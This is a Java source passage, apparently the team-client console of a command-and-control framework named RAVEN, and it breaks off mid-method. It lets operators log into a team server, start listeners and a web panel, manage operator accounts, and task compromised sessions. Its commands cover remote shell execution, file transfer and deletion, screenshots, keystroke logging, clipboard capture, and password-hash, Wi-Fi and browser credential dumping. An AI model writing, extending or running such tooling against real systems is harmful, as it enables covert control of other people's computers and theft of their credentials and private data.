package com.raven.interfaces;

import com.google.gson.Gson;
import com.raven.core.command.CommandRegistry;
import com.raven.core.command.CommandRegistry.Category;
import com.raven.core.command.CommandRegistry.CommandDef;
import com.raven.core.database.TeamDatabase.OperatorRole;
import com.raven.core.output.PromptManager;
import com.raven.utils.AnsiColor;
import com.raven.utils.ServerConfig;
import com.raven.utils.TerminalHelper;
import com.raven.utils.SystemHelper;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

public final class TeamClient {

    private static final String PROMPT_TOP = AnsiColor.Red + "┌──{" + AnsiColor.White + "RAVEN-CLIENT" + AnsiColor.Red + "}" + AnsiColor.Reset;
    private static final String PROMPT_BOTTOM = AnsiColor.Red + "└─" + AnsiColor.White + ">>" + AnsiColor.Reset + " ";
    private static final String INDENT = "  ";

    private final ServerConfig Config;
    private final String TsHost;
    private final int TsPort;
    private final HttpClient Http;
    private final Gson Json = new Gson();

    private String Token;
    private String OperatorName;
    private OperatorRole OperatorRoleValue;
    private volatile boolean Running = true;
    private BufferedReader ConsoleReader;

    public TeamClient(ServerConfig Config, String TsHost, int TsPort) {
        this.Config = Config;
        this.TsHost = TsHost;
        this.TsPort = TsPort;
        this.Http = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(5)).build();
        PromptManager.SetPrompt(PROMPT_BOTTOM);
    }

    public void Run() {
        if (!Login()) return;
        ConsoleReader = new BufferedReader(new InputStreamReader(System.in));
        while (Running) {
            try {
                System.out.println();
                System.out.println(PROMPT_TOP);
                System.out.print(PROMPT_BOTTOM);
                System.out.flush();
                PromptManager.MarkVisible(true);
                String Input = ConsoleReader.readLine();
                PromptManager.MarkVisible(false);
                if (Input == null) break;
                Input = Input.trim();
                if (Input.isEmpty()) continue;
                String[] Parts = Input.split("\\s+");
                String Cmd = Parts[0].toLowerCase();
                Dispatch(Cmd, Parts, Input);
            } catch (IOException Ex) {
                break;
            }
        }
        Logger.Ok("Disconnected from TeamServer");
        System.exit(0);
    }

    private void Dispatch(String Cmd, String[] P, String Line) {
        switch (Cmd) {
            case "exit", "quit" -> {
                Running = false;
                try {
                    Post("/api/auth/logout", null);
                } catch (Exception Ign) {}
            }
            case "help" -> ShowHelp();
            case "clean" -> SystemHelper.ClearScreen();
            case "sessions", "agents" -> ShowSessions();
            case "status" -> ShowStatus();
            case "logs" -> ShowLogs();
            case "chat" -> ShowChat();
            case "chathistory" -> ShowChatHistory(100);
            case "listopt" -> ShowOperators();
            case "exec" -> {
                if (P.length < 3) {
                    Logger.Warn("usage: " + CommandRegistry.Get("exec").Usage());
                    break;
                }
                try {
                    Exec(ParseInt(P[1]), Line.substring(Line.indexOf(P[2])));
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "broadcast" -> {
                if (P.length < 3) {
                    Logger.Warn("usage: " + CommandRegistry.Get("broadcast").Usage());
                    break;
                }
                DoBroadcast(P[1].toLowerCase(), Line.substring(Line.indexOf(P[2])));
            }
            case "kill" -> {
                if (P.length < 2) {
                    Logger.Warn("usage: " + CommandRegistry.Get("kill").Usage());
                    break;
                }
                try {
                    Kill(ParseInt(P[1]));
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "sysinfo", "info" -> {
                if (P.length < 2) {
                    Logger.Warn("usage: " + CommandRegistry.Get("sysinfo").Usage());
                    break;
                }
                try {
                    ShowSessionInfo(ParseInt(P[1]));
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "whoami" -> {
                if (P.length < 2) Logger.Warn("usage: whoami <id>");
                else SimpleExec(P, "whoami");
            }
            case "ps" -> {
                if (P.length < 2) Logger.Warn("usage: ps <id>");
                else SimpleExec(P, "ps");
            }
            case "pwd" -> {
                if (P.length < 2) Logger.Warn("usage: pwd <id>");
                else SimpleExec(P, "pwd");
            }
            case "env" -> {
                if (P.length < 2) Logger.Warn("usage: env <id>");
                else SimpleExec(P, "env");
            }
            case "ifconfig", "ipconfig" -> {
                if (P.length < 2) Logger.Warn("usage: ifconfig <id>");
                else SimpleExec(P, "ifconfig");
            }
            case "netstat" -> {
                if (P.length < 2) Logger.Warn("usage: netstat <id>");
                else SimpleExec(P, "netstat");
            }
            case "screenshot" -> {
                if (P.length < 2) Logger.Warn("usage: screenshot <id>");
                else SimpleExec(P, "screenshot");
            }
            case "ping" -> {
                if (P.length < 2) Logger.Warn("usage: ping <id>");
                else SimpleExec(P, "ping");
            }
            case "reconnect" -> {
                if (P.length < 2) Logger.Warn("usage: reconnect <id>");
                else SimpleExec(P, "reconnect");
            }
            case "sleep" -> {
                if (P.length < 3) {
                    Logger.Warn("usage: " + CommandRegistry.Get("sleep").Usage());
                    break;
                }
                try {
                    Exec(ParseInt(P[1]), "sleep " + P[2]);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "ls" -> {
                if (P.length < 2) {
                    Logger.Warn("usage: ls <id> [path]");
                    break;
                }
                try {
                    Exec(ParseInt(P[1]), P.length > 2 ? "ls " + Args(P, 2) : "ls");
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "cat" -> {
                if (P.length < 3) {
                    Logger.Warn("usage: cat <id> <file>");
                    break;
                }
                try {
                    Exec(ParseInt(P[1]), "cat " + Args(P, 2));
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "download" -> {
                if (P.length < 3) {
                    Logger.Warn("usage: " + CommandRegistry.Get("download").Usage());
                    break;
                }
                try {
                    DoDownload(ParseInt(P[1]), P[2]);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "upload" -> {
                if (P.length < 3) {
                    Logger.Warn("usage: " + CommandRegistry.Get("upload").Usage());
                    break;
                }
                try {
                    String[] Up = Args(P, 2).split("\\s+", 2);
                    DoUpload(ParseInt(P[1]), Up[0], Up.length > 1 ? Up[1] : "");
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "note" -> {
                if (P.length < 3) {
                    Logger.Warn("usage: " + CommandRegistry.Get("note").Usage());
                    break;
                }
                try {
                    SetNote(ParseInt(P[1]), Args(P, 2));
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "getnote" -> {
                if (P.length < 2) {
                    Logger.Warn("usage: " + CommandRegistry.Get("getnote").Usage());
                    break;
                }
                try {
                    GetNote(ParseInt(P[1]));
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "history" -> {
                int Id = P.length > 1 ? ParseIntSafe(P[1], 0) : 0;
                int Lim = P.length > 2 ? ParseIntSafe(P[2], 50) : 50;
                ShowHistory(Id, Lim);
            }
            case "ch" -> {
                if (P.length < 3) {
                    Logger.Warn("usage: ch <name> <msg>");
                    break;
                }
                SendChat(P[1], Line.substring(Line.indexOf(P[2])));
            }
            case "gc" -> {
                if (P.length < 3) {
                    Logger.Warn("usage: gc <all|name,...> <msg>");
                    break;
                }
                String Target = P[1].toLowerCase();
                String Msg = Line.substring(Line.indexOf(P[2]));
                if (Target.equals("all")) {
                    SendChat("all", Msg);
                } else {
                    for (String N : Target.split(",")) {
                        String T = N.trim();
                        if (!T.isEmpty()) SendChat(T, Msg);
                    }
                }
            }
            case "shell" -> {
                if (P.length < 3) {
                    Logger.Warn("usage: shell <id> <cmd>");
                    break;
                }
                try {
                    Exec(ParseInt(P[1]), "shell " + Args(P, 2));
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "self-destruct", "selfdestruct" -> {
                if (OperatorRoleValue == null || !OperatorRoleValue.CanManage()) {
                    Logger.Warn("ADMIN/SUPER required");
                    break;
                }
                if (P.length < 2) {
                    Logger.Warn("usage: self-destruct <id>");
                    break;
                }
                try {
                    Exec(ParseInt(P[1]), "self-destruct");
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "sessions-history", "sesshistory" -> {
                int Lim = P.length > 1 ? ParseIntSafe(P[1], 50) : 50;
                ShowSessionHistory(Lim);
            }
            case "use" -> {
                if (P.length < 2) { Logger.Warn("usage: use <id>"); break; }
                try { InteractiveSession(ParseInt(P[1])); }
                catch (NumberFormatException Ex) { Logger.Warn("invalid session ID"); }
            }
            case "id" -> { if (P.length < 2) Logger.Warn("usage: id <id>"); else SimpleExec(P, "id"); }
            case "hostname" -> { if (P.length < 2) Logger.Warn("usage: hostname <id>"); else SimpleExec(P, "hostname"); }
            case "uname" -> { if (P.length < 2) Logger.Warn("usage: uname <id>"); else SimpleExec(P, "uname"); }
            case "arp" -> { if (P.length < 2) Logger.Warn("usage: arp <id>"); else SimpleExec(P, "arp"); }
            case "route" -> { if (P.length < 2) Logger.Warn("usage: route <id>"); else SimpleExec(P, "route"); }
            case "users" -> { if (P.length < 2) Logger.Warn("usage: users <id>"); else SimpleExec(P, "users"); }
            case "groups" -> { if (P.length < 2) Logger.Warn("usage: groups <id>"); else SimpleExec(P, "groups"); }
            case "services" -> { if (P.length < 2) Logger.Warn("usage: services <id>"); else SimpleExec(P, "services"); }
            case "privcheck" -> { if (P.length < 2) Logger.Warn("usage: privcheck <id>"); else SimpleExec(P, "privcheck"); }
            case "antivirus" -> { if (P.length < 2) Logger.Warn("usage: antivirus <id>"); else SimpleExec(P, "antivirus"); }
            case "crontab" -> { if (P.length < 2) Logger.Warn("usage: crontab <id>"); else SimpleExec(P, "crontab"); }
            case "clipboard" -> { if (P.length < 2) Logger.Warn("usage: clipboard <id>"); else SimpleExec(P, "clipboard"); }
            case "hashdump" -> { if (P.length < 2) Logger.Warn("usage: hashdump <id>"); else SimpleExec(P, "hashdump"); }
            case "wifidump" -> { if (P.length < 2) Logger.Warn("usage: wifidump <id>"); else SimpleExec(P, "wifidump"); }
            case "dumpbrowsers" -> { if (P.length < 2) Logger.Warn("usage: dumpbrowsers <id>"); else SimpleExec(P, "dumpbrowsers"); }
            case "lastlog" -> { if (P.length < 2) Logger.Warn("usage: lastlog <id>"); else SimpleExec(P, "lastlog"); }
            case "jitter" -> {
                if (P.length < 3) { Logger.Warn("usage: jitter <id> <ms>"); break; }
                SimpleExec(new String[]{P[0], P[1]}, "jitter " + Args(P, 2));
            }
            case "keystroke" -> {
                if (P.length < 3) { Logger.Warn("usage: keystroke <id> <on|off>"); break; }
                SimpleExec(new String[]{P[0], P[1]}, "keystroke " + Args(P, 2));
            }
            case "searchfiles" -> {
                if (P.length < 3) { Logger.Warn("usage: searchfiles <id> <pattern>"); break; }
                SimpleExec(new String[]{P[0], P[1]}, "searchfiles " + Args(P, 2));
            }
            case "osquery" -> {
                if (P.length < 3) { Logger.Warn("usage: osquery <id> <sql>"); break; }
                SimpleExec(new String[]{P[0], P[1]}, "osquery " + Args(P, 2));
            }
            case "head" -> {
                if (P.length < 3) { Logger.Warn("usage: head <id> <file> [n]"); break; }
                SimpleExec(new String[]{P[0], P[1]}, "head " + Args(P, 2));
            }
            case "tail" -> {
                if (P.length < 3) { Logger.Warn("usage: tail <id> <file> [n]"); break; }
                SimpleExec(new String[]{P[0], P[1]}, "tail " + Args(P, 2));
            }
            case "rm" -> {
                if (P.length < 3) { Logger.Warn("usage: rm <id> <path>"); break; }
                SimpleExec(new String[]{P[0], P[1]}, "rm " + Args(P, 2));
            }
            case "mkdir" -> {
                if (P.length < 3) { Logger.Warn("usage: mkdir <id> <path>"); break; }
                SimpleExec(new String[]{P[0], P[1]}, "mkdir " + Args(P, 2));
            }
            case "cp" -> {
                if (P.length < 3) { Logger.Warn("usage: cp <id> <src> <dst>"); break; }
                SimpleExec(new String[]{P[0], P[1]}, "cp " + Args(P, 2));
            }
            case "mv" -> {
                if (P.length < 3) { Logger.Warn("usage: mv <id> <src> <dst>"); break; }
                SimpleExec(new String[]{P[0], P[1]}, "mv " + Args(P, 2));
            }
            case "chmod" -> {
                if (P.length < 3) { Logger.Warn("usage: chmod <id> <mode> <file>"); break; }
                SimpleExec(new String[]{P[0], P[1]}, "chmod " + Args(P, 2));
            }
            case "find" -> {
                if (P.length < 3) { Logger.Warn("usage: find <id> <path> [name]"); break; }
                SimpleExec(new String[]{P[0], P[1]}, "find " + Args(P, 2));
            }
            case "grep" -> {
                if (P.length < 3) { Logger.Warn("usage: grep <id> <pattern> <file>"); break; }
                SimpleExec(new String[]{P[0], P[1]}, "grep " + Args(P, 2));
            }
            case "hash" -> {
                if (P.length < 3) { Logger.Warn("usage: hash <id> <file> [sha256|md5]"); break; }
                SimpleExec(new String[]{P[0], P[1]}, "hash " + Args(P, 2));
            }
            case "cd" -> {
                if (P.length < 3) { Logger.Warn("usage: cd <id> <path>"); break; }
                SimpleExec(new String[]{P[0], P[1]}, "cd " + Args(P, 2));
            }
            case "stats" -> {
                try {
                    Map<String, Object> R = Get("/api/agents");
                    @SuppressWarnings("unchecked")
                    List<Map<String, Object>> Agents = (List<Map<String, Object>>) R.getOrDefault("Agents", new ArrayList<>());
                    System.out.println(TerminalHelper.Box("SESSION STATS"));
                    System.out.println();
                    long Raw   = Agents.stream().filter(A -> "ReverseShell".equals(A.getOrDefault("Type", ""))).count();
                    long Raven = Agents.stream().filter(A -> "RAVEN".equals(A.getOrDefault("Type", ""))).count();
                    long Http  = Agents.stream().filter(A -> "HttpBeacon".equals(A.getOrDefault("Type", ""))).count();
                    Logger.Custom("  %sTotal Active  %s%d%n", AnsiColor.Red, AnsiColor.White, Agents.size());
                    if (Raw   > 0) Logger.Custom("  %sRaw Shell     %s%d%n", AnsiColor.Red, AnsiColor.White, Raw);
                    if (Raven > 0) Logger.Custom("  %sRAVEN Agent   %s%d%n", AnsiColor.Red, AnsiColor.White, Raven);
                    if (Http  > 0) Logger.Custom("  %sHTTP Beacon   %s%d%n", AnsiColor.Red, AnsiColor.White, Http);
                    System.out.println();
                } catch (Exception Ex) { Logger.Error(Ex.getMessage()); }
            }
            case "tasks" -> {
                try {
                    Map<String, Object> R = Get("/api/tasks");
                    @SuppressWarnings("unchecked")
                    List<Map<String, Object>> Tasks = (List<Map<String, Object>>) R.getOrDefault("Tasks", new ArrayList<>());
                    System.out.println(TerminalHelper.Box("PENDING TASKS (" + Tasks.size() + ")"));
                    System.out.println();
                    if (Tasks.isEmpty()) { Logger.Info(INDENT + "no pending tasks"); System.out.println(); break; }
                    for (Map<String, Object> T : Tasks)
                        Logger.Custom("  [%s] session-%s  %s%n", T.getOrDefault("Queued", "?"), T.getOrDefault("AgentId", "?"), T.getOrDefault("Command", "?"));
                    System.out.println();
                } catch (Exception Ex) { Logger.Error(Ex.getMessage()); }
            }
            case "addopt" -> {
                String[] AddParts = Line.split("\\s+");
                if (AddParts.length < 3) { Logger.Warn("usage: addopt <user> <pass> [ROLE]"); break; }
                String AddUser = AddParts[1];
                String AddPass = AddParts[2];
                String AddRole = AddParts.length > 3 ? AddParts[3].toUpperCase() : "OPERATOR";
                try {
                    Map<String, Object> Body = new LinkedHashMap<>();
                    Body.put("Username", AddUser); Body.put("Password", AddPass);
                    Body.put("Role", AddRole); Body.put("Operator", OperatorName);
                    Map<String, Object> R = Post("/api/team/operators/create", Body);
                    if (R.containsKey("Error")) Logger.Error(R.get("Error").toString());
                    else Logger.Ok("operator created: " + P[1] + " [" + AddRole + "]");
                } catch (Exception Ex) { Logger.Error(Ex.getMessage()); }
            }
            case "delopt" -> {
                if (P.length < 2) { Logger.Warn("usage: delopt <user>"); break; }
                try {
                    Map<String, Object> R = Post("/api/team/operators/delete", Map.of("Username", P[1], "Operator", OperatorName));
                    if (R.containsKey("Error")) Logger.Error(R.get("Error").toString());
                    else Logger.Ok("operator deleted: " + P[1]);
                } catch (Exception Ex) { Logger.Error(Ex.getMessage()); }
            }
            case "setrole" -> {
                if (P.length < 3) { Logger.Warn("usage: setrole <user> <ROLE>"); break; }
                try {
                    Map<String, Object> Body = Map.of("Username", P[1], "Role", P[2].toUpperCase(), "Operator", OperatorName);
                    Map<String, Object> R = Post("/api/team/operators/role", Body);
                    if (R.containsKey("Error")) Logger.Error(R.get("Error").toString());
                    else Logger.Ok("role updated: " + P[1] + " → " + P[2].toUpperCase());
                } catch (Exception Ex) { Logger.Error(Ex.getMessage()); }
            }
            case "passwd" -> {
                if (P.length < 3) { Logger.Warn("usage: passwd <user> <newpass>"); break; }
                try {
                    Map<String, Object> Body = Map.of("Username", P[1], "Password", P[2], "Operator", OperatorName);
                    Map<String, Object> R = Post("/api/team/operators/password", Body);
                    if (R.containsKey("Error")) Logger.Error(R.get("Error").toString());
                    else Logger.Ok("password changed: " + P[1]);
                } catch (Exception Ex) { Logger.Error(Ex.getMessage()); }
            }
            case "kick" -> {
                if (P.length < 2) { Logger.Warn("usage: kick <user>"); break; }
                try {
                    Map<String, Object> R = Post("/api/team/operators/kick", Map.of("Username", P[1], "Operator", OperatorName));
                    if (R.containsKey("Error")) Logger.Error(R.get("Error").toString());
                    else Logger.Ok("operator kicked: " + P[1]);
                } catch (Exception Ex) { Logger.Error(Ex.getMessage()); }
            }
            case "start" -> {
                String ListenHost = "0.0.0.0";
                int    ListenPort = Config.GetServerPort();
                String ListenMode = "MULTI";
                for (int Idx = 1; Idx < P.length; Idx++) {
                    switch (P[Idx]) {
                        case "-lhost" -> { if (Idx + 1 < P.length) ListenHost = P[++Idx]; }
                        case "-lport" -> { if (Idx + 1 < P.length) ListenPort = ParseIntSafe(P[++Idx], ListenPort); }
                        case "-M"     -> { if (Idx + 1 < P.length) ListenMode = P[++Idx].toUpperCase(); }
                    }
                }
                try {
                    Map<String, Object> Body = new LinkedHashMap<>();
                    Body.put("Host", ListenHost);
                    Body.put("Port", ListenPort);
                    Body.put("Mode", ListenMode);
                    Map<String, Object> R = Post("/api/server/start", Body);
                    if (R.containsKey("Error")) Logger.Error(R.get("Error").toString());
                    else Logger.Ok("listener started on " + ListenHost + ":" + ListenPort + " [" + ListenMode + "]");
                } catch (Exception Ex) { Logger.Error(Ex.getMessage()); }
            }
            case "stop" -> {
                try {
                    Map<String, Object> R = Post("/api/server/stop", Map.of());
                    if (R.containsKey("Error")) Logger.Error(R.get("Error").toString());
                    else Logger.Ok("listener stopped");
                } catch (Exception Ex) { Logger.Error(Ex.getMessage()); }
            }
            case "webstart" -> {
                String WHost = P.length > 1 ? P[1] : "0.0.0.0";
                int WPort = P.length > 2 ? ParseIntSafe(P[2], 5000) : 5000;
                try {
                    Map<String, Object> R = Post("/api/server/webpanel/start",
                        Map.of("Host", WHost, "Port", WPort, "Operator", OperatorName));
                    if (R.containsKey("Error")) Logger.Error(R.get("Error").toString());
                    else Logger.Ok("web panel started → " + R.getOrDefault("URL", ""));
                } catch (Exception Ex) { Logger.Error(Ex.getMessage()); }
            }
            case "webstop" -> {
                try {
                    Map<String, Object> R = Post("/api/server/webpanel/stop", Map.of("Operator", OperatorName));
                    if (R.containsKey("Error")) Logger.Error(R.get("Error").toString());
                    else Logger.Ok("web panel stopped");
                } catch (Exception Ex) { Logger.Error(Ex.getMessage()); }
            }
            case "webstatus" -> {
                try {
                    Map<String, Object> R = Get("/api/server/webpanel/status");
                    String Running = Boolean.parseBoolean(R.getOrDefault("Running", "false").toString()) ? "running" : "stopped";
                    Logger.Custom("  %sWeb panel %s%s%n", AnsiColor.Red, AnsiColor.White, Running);
                    if (R.containsKey("URL")) Logger.Custom("  %sURL       %s%s%n", AnsiColor.Red, AnsiColor.White, R.get("URL"));
                } catch (Exception Ex) { Logger.Error(Ex.getMessage()); }
            }
            default -> {
                Logger.Error("unknown command: " + Cmd);
                Logger.Info("type 'help' for available commands");
            }
        }
    }

    private void InteractiveSession(int AgentId) {
        String OldPrompt = PROMPT_BOTTOM;
        String SessionPrompt = AnsiColor.Red + "[session-" + AgentId + "] " + AnsiColor.White + ">> " + AnsiColor.Reset;
        PromptManager.SetPrompt(SessionPrompt);
        Logger.Custom(INDENT + "%sInteractive shell — session-%d%s  (type 'back' to return)%n%n",
            AnsiColor.White, AgentId, AnsiColor.Reset);
        while (Running) {
            try {
                System.out.print(SessionPrompt);
                System.out.flush();
                PromptManager.MarkVisible(true);
                String Input = ConsoleReader.readLine();
                PromptManager.MarkVisible(false);
                if (Input == null) break;
                Input = Input.trim();
                if (Input.isBlank()) continue;
                if (Input.equalsIgnoreCase("back") || Input.equalsIgnoreCase("exit")) break;
                if (Input.equalsIgnoreCase("clean")) { com.raven.utils.SystemHelper.ClearScreen(); continue; }
                Exec(AgentId, Input);
            } catch (Exception Ex) {
                Logger.Error(Ex.getMessage());
                break;
            }
        }
        PromptManager.SetPrompt(OldPrompt);
        Logger.Custom(INDENT + "%s← returned to TeamClient%s%n%n", AnsiColor.Green, AnsiColor.Reset);
    }

    private boolean Login() {
        System.out.println();
        System.out.println(TerminalHelper.Box("TEAMCLIENT — CONNECT TO TEAMSERVER"));
        System.out.println();
        Logger.Custom(INDENT + "%sTeamServer:%s %s:%d%n%n", AnsiColor.Red, AnsiColor.White, TsHost, TsPort, AnsiColor.Reset);
        try {
            Get("/api/server/status");
        } catch (java.net.ConnectException Ex) {
            Logger.Error("connection refused — " + TsHost + ":" + TsPort);
            System.out.println();
            Logger.Custom(INDENT + "TeamClient requires a running TeamServer Web (-TSW).%n");
            Logger.Custom(INDENT + "Start with: java -jar raven.jar -TSW -p 4444 -tp %d%n%n", TsPort);
            return false;
        } catch (Exception Ex) {
            Logger.Error("TeamServer unreachable: " + Ex.getMessage());
            return false;
        }
        BufferedReader Reader = new BufferedReader(new InputStreamReader(System.in));
        for (int Try = 0; Try < 3; Try++) {
            try {
                Logger.Custom(INDENT + "%sUsername:%s ", AnsiColor.White, AnsiColor.Reset);
                System.out.flush();
                String User = Reader.readLine();
                if (User == null || User.isBlank()) return false;
                Logger.Custom(INDENT + "%sPassword:%s ", AnsiColor.White, AnsiColor.Reset);
                System.out.flush();
                String Pass = Reader.readLine();
                if (Pass == null) return false;
                Map<String, Object> Body = new LinkedHashMap<>();
                Body.put("Username", User.trim());
                Body.put("Password", Pass.trim());
                Map<String, Object> Resp = Post("/api/auth/login", Body);
                if (Resp.containsKey("Error")) {
                    Logger.Error(Resp.get("Error").toString() + " (" + (Try + 1) + "/3)");
                    continue;
                }
                Token = Resp.getOrDefault("Token", "").toString();
                OperatorName = Resp.getOrDefault("Username", User.trim()).toString();
                OperatorRoleValue = OperatorRole.FromString(Resp.getOrDefault("Role", "MEMBER").toString());
                System.out.println();
                Logger.Ok("Welcome, " + OperatorName + " [" + OperatorRoleValue + "]");
                Logger.Custom(INDENT + "%sConnected to TeamServer at %s:%d%s%n%n", AnsiColor.White, TsHost, TsPort, AnsiColor.Reset);
                return true;
            } catch (Exception Ex) {
                Logger.Error(Ex.getMessage());
            }
        }
        Logger.Error("authentication failed");
        return false;
    }

    private void ShowHelp() {
        System.out.println(TerminalHelper.Box("TEAMCLIENT COMMANDS"));
        System.out.println();
        Logger.Custom(INDENT + "%sConnected as:%s %s[%s / %s]%s  Server: %s%s:%d%s%n%n", AnsiColor.Red, AnsiColor.White, AnsiColor.Green, OperatorName != null ? OperatorName : "—", OperatorRoleValue != null ? OperatorRoleValue.name() : "—", AnsiColor.White, AnsiColor.Red, TsHost, TsPort, AnsiColor.Reset);
        for (Category Cat : Category.values()) {
            List<CommandDef> Cmds = CommandRegistry.ByCategory(Cat);
            if (Cmds.isEmpty()) continue;
            Logger.Custom(INDENT + "%s%s%s%n", AnsiColor.Red, Cat.name(), AnsiColor.Reset);
            for (CommandDef Def : Cmds) Logger.Custom(INDENT + "  %s%-42s%s %s%n", AnsiColor.White, Def.Usage(), AnsiColor.Reset, Def.Description());
            System.out.println();
        }
    }

    private void ShowSessions() {
        try {
            Map<String, Object> R = Get("/api/agents");
            @SuppressWarnings("unchecked")
            List<Map<String, Object>> Agents = (List<Map<String, Object>>) R.getOrDefault("Agents", new ArrayList<>());
            System.out.println(TerminalHelper.Box("ACTIVE SESSIONS (" + Agents.size() + ")"));
            System.out.println();
            if (Agents.isEmpty()) {
                Logger.Info(INDENT + "no active sessions");
                System.out.println();
                return;
            }
            Logger.Custom(INDENT + "%s%-5s %-14s %-16s %-14s %-10s %-10s %s%s%n", AnsiColor.Red, "ID", "NAME", "IP", "TYPE", "OS", "USER", "KEY", AnsiColor.Reset);
            System.out.println(TerminalHelper.Divider());
            for (Map<String, Object> A : Agents) {
                Logger.Custom(INDENT + "%s#%-4s %-14s %-16s %-14s %-10s %-10s %s%s%n", AnsiColor.White, ((Number) A.getOrDefault("ID", 0.0)).intValue(), TerminalHelper.Truncate(A.getOrDefault("AgentName", "?").toString(), 14), TerminalHelper.Truncate(A.getOrDefault("AgentIP", "?").toString(), 16), A.getOrDefault("Type", "?"), TerminalHelper.Truncate(A.getOrDefault("OS", "?").toString(), 10), TerminalHelper.Truncate(A.getOrDefault("User", "?").toString(), 10), A.getOrDefault("SessionKey", "—"), AnsiColor.Reset);
            }
            System.out.println();
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private void ShowSessionInfo(int Id) {
        try {
            Map<String, Object> R = Get("/api/agents");
            @SuppressWarnings("unchecked")
            List<Map<String, Object>> Agents = (List<Map<String, Object>>) R.getOrDefault("Agents", new ArrayList<>());
            Map<String, Object> A = Agents.stream()
                .filter(X -> ((Number) X.getOrDefault("ID", -1.0)).intValue() == Id)
                .findFirst()
                .orElse(null);
            if (A == null) {
                Logger.Warn("session not found");
                return;
            }
            System.out.println(TerminalHelper.Box("SESSION INFO — #" + Id));
            System.out.println();
            A.forEach((K, V) -> Logger.Custom(INDENT + "%s%-14s%s %s%n", AnsiColor.Red, K, AnsiColor.White, V));
            Logger.Custom("%s%n", AnsiColor.Reset);
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private void ShowStatus() {
        try {
            Map<String, Object> R = Get("/api/server/status");
            System.out.println(TerminalHelper.Box("SERVER STATUS"));
            System.out.println();
            Logger.Custom(INDENT + "%sStatus    %s%s%s%n", AnsiColor.Red, AnsiColor.Green, R.getOrDefault("Status", "?"), AnsiColor.Reset);
            Logger.Custom(INDENT + "%sMode      %s%s%n", AnsiColor.Red, AnsiColor.White, R.getOrDefault("Mode", "?").toString().toUpperCase());
            Logger.Custom(INDENT + "%sAddress   %s%s:%d%n", AnsiColor.Red, AnsiColor.White, R.getOrDefault("Host", "?"), ((Number) R.getOrDefault("Port", 0.0)).intValue());
            Logger.Custom(INDENT + "%sUptime    %s%s%n", AnsiColor.Red, AnsiColor.White, R.getOrDefault("Uptime", "?"));
            Logger.Custom(INDENT + "%sSessions  %s%d%n", AnsiColor.Red, AnsiColor.White, ((Number) R.getOrDefault("Agents", 0.0)).intValue());
            long SleepMs  = ((Number) R.getOrDefault("SleepIntervalMs", 5000.0)).longValue();
            long JitterMs = ((Number) R.getOrDefault("JitterMs", 1000.0)).longValue();
            Logger.Custom(INDENT + "%sSleep     %s%ds ± %dms%n", AnsiColor.Red, AnsiColor.White, SleepMs / 1000, JitterMs);
            String DbType   = R.getOrDefault("DbType", "none").toString();
            boolean DbUp    = Boolean.parseBoolean(R.getOrDefault("DbOnline", "false").toString());
            Logger.Custom(INDENT + "%sDB        %s%s (%s)%n", AnsiColor.Red, AnsiColor.White, DbUp ? "connected" : "offline", DbType);
            Logger.Custom(INDENT + "%sServer    %shttp://%s:%d%s%n%n", AnsiColor.Red, AnsiColor.White, TsHost, TsPort, AnsiColor.Reset);
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private void ShowLogs() {
        try {
            Map<String, Object> R = Get("/api/logs");
            @SuppressWarnings("unchecked")
            List<String> Logs = (List<String>) R.getOrDefault("Logs", new ArrayList<>());
            System.out.println(TerminalHelper.Box("RECENT LOGS (last 30)"));
            System.out.println();
            Logs.stream()
                .skip(Math.max(0, Logs.size() - 30))
                .forEach(L -> Logger.Custom(INDENT + "%s%s%s%n", AnsiColor.White, L, AnsiColor.Reset));
            System.out.println();
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private void ShowChat() {
        try {
            Map<String, Object> R = Get("/api/team/chat/messages");
            @SuppressWarnings("unchecked")
            List<Map<String, Object>> Msgs = (List<Map<String, Object>>) R.getOrDefault("Messages", new ArrayList<>());
            System.out.println(TerminalHelper.Box("CHAT MESSAGES"));
            System.out.println();
            if (Msgs.isEmpty()) {
                Logger.Info(INDENT + "no messages");
                System.out.println();
                return;
            }
            for (Map<String, Object> M : Msgs) {
                String From = M.getOrDefault("From", "?").toString();
                String To = M.getOrDefault("To", "all").toString();
                boolean Mine = From.equals(OperatorName);
                Logger.Custom(INDENT + "%s[%s] %s%s%s [%s]: %s%s%n", Mine ? AnsiColor.Green : AnsiColor.White, M.getOrDefault("Timestamp", ""), Mine ? AnsiColor.Green : AnsiColor.Red, From, AnsiColor.Reset, To.equals("all") ? "all" : "→ " + To, M.getOrDefault("Message", ""), AnsiColor.Reset);
            }
            System.out.println();
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private void ShowChatHistory(int Limit) {
        try {
            Map<String, Object> R = Post("/api/team/chat/logs", Map.of("Limit", Limit));
            @SuppressWarnings("unchecked")
            List<Map<String, Object>> Messages = (List<Map<String, Object>>) R.getOrDefault("Logs", new ArrayList<>());
            System.out.println(TerminalHelper.Box("CHAT HISTORY (last " + Limit + ")"));
            System.out.println();
            if (Messages.isEmpty()) {
                Logger.Info(INDENT + "no chat history");
                System.out.println();
                return;
            }
